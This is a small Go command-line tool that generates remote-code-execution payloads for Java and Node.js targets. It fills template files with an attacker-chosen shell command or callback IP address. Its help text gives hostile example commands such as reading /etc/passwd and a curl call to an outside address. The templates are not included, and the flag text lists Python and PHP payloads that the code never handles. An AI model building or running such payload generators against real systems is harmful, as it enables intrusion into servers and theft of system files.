package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

var (
	payload = flag.String("payload", "", "Type payload  java, python, php")
	command = flag.String("command", "", "Type command like , cat /etc/passwd")
	ip      = flag.String("ip", "", "Ip address for rce ")
)

func main() {
	flag.Parse()
	if *payload == "java" {
		readJava()
	}

	if *payload == "nodejs" {
		readNode()
	}

	fmt.Println("Done ..")
}

func readJava() {
	flag.Parse()
	if *command == "" {
		fmt.Println("Java payload need command like , curl 100.100.100.1:443")
		os.Exit(1)
	}
	data, err := ioutil.ReadFile("DO_NOT_DELETE_THIS_FOLDER/javapayload.file")
	if err != nil {
		fmt.Println("File reading error", err)
		return
	}
	newContents := strings.Replace(string(data), "codeinjection", *command, -1)

	fmt.Println(newContents)
}

func readNode() {
	flag.Parse()
	if *ip == "" {
		fmt.Println("--ip cannot empty")
		os.Exit(1)
	}
	data, err := ioutil.ReadFile("DO_NOT_DELETE_THIS_FOLDER/nodejs.file")
	if err != nil {
		fmt.Println("File reading error", err)
		return
	}
	newContents := strings.Replace(string(data), "ipinjection", *ip, -1)

	fmt.Println(newContents)
}
